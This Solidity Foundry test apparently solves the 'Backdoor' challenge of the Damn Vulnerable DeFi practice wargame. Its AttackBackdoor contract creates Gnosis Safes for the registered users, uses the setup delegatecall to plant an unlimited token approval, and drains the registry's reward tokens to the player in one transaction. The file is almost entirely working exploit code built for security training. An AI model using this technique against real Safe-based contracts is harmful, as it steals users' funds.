// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

import {WalletRegistry} from "../src/backdoor/WalletRegistry.sol";
import {GnosisSafe} from "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import {GnosisSafeProxy} from "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import {GnosisSafeProxyFactory} from "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import {DamnValuableToken} from "../src/DamnValuableToken.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

/*  
why approve not transfer?
because this function will excute first, but wallet not balance for now
*/
contract Malicious {
    function approve(address attacker, IERC20 token) public {
        token.approve(attacker, type(uint256).max);
    }
}

contract AttackBackdoor {
    WalletRegistry walletRegistry;
    GnosisSafeProxyFactory factory;
    GnosisSafe masterCopy;
    IERC20 token;
    Malicious malicious;
    GnosisSafeProxy proxy;

    constructor(address _walletRegistry, address[] memory users) {
        // Set state variables
        walletRegistry = WalletRegistry(_walletRegistry);
        masterCopy = GnosisSafe(payable(walletRegistry.masterCopy()));
        factory = GnosisSafeProxyFactory(walletRegistry.walletFactory());
        token = IERC20(walletRegistry.token());

        // Deploy malicious backdoor for approve
        malicious = new Malicious();

        // Create a new safe through the factory for every user
        for (uint256 i; i < users.length; i++) {
            /*  
                address[] calldata _owners,
                uint256 _threshold,
                address to,
                bytes calldata data,
                address fallbackHandler,
                address paymentToken,
                uint256 payment,
                address payable paymentReceiver
            */
            address[] memory owners = new address[](1);
            owners[0] = users[i];
            bytes memory data = abi.encodeWithSelector(
                Malicious.approve.selector,
                address(this),
                token
            );
            bytes memory initializer = abi.encodeCall(
                GnosisSafe.setup,
                (
                    owners,
                    1,
                    address(malicious),
                    data,
                    address(0),
                    address(0),
                    0,
                    payable(address(0))
                )
            );
            proxy = factory.createProxyWithCallback(
                address(masterCopy),
                initializer,
                0,
                walletRegistry
            );
            token.transferFrom(
                address(proxy),
                msg.sender,
                token.balanceOf(address(proxy))
            );
        }
    }
}

contract BackDoorTest is Test {
    GnosisSafe masterCopy;
    DamnValuableToken token;
    GnosisSafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    address deployer = makeAddr("deployer");
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");
    address david = makeAddr("david");
    address player = makeAddr("player");
    address[] users = [alice, bob, charlie, david];

    uint256 AMOUNT_TOKENS_DISTRIBUTED = 40 ether;

    modifier excuteByUser(address _user) {
        vm.startPrank(_user);
        _;
        vm.stopPrank();
    }

    function setUp() public {
        vm.startPrank(deployer);

        token = new DamnValuableToken();
        masterCopy = new GnosisSafe();
        walletFactory = new GnosisSafeProxyFactory();
        walletRegistry = new WalletRegistry(
            address(masterCopy),
            address(walletFactory),
            address(token),
            users
        );

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();

        assertEq(walletRegistry.owner(), deployer);

        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertEq(walletRegistry.beneficiaries(users[i]), true);

            // not owner
            vm.expectRevert(bytes4(keccak256(bytes("Unauthorized()"))));
            vm.prank(users[i]);
            // User cannot add beneficiaries
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    function testExploit() public excuteByUser(player) {
        // Player must have used a single transaction

        new AttackBackdoor(address(walletRegistry), users);

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);
            assertFalse(wallet == address(0), "User did not register a wallet");

            // User is no longer registered as a beneficiary
            assertEq(walletRegistry.beneficiaries(users[i]), false);
        }

        // Player must own all tokens
        assertEq(token.balanceOf(player), AMOUNT_TOKENS_DISTRIBUTED);
    }
}
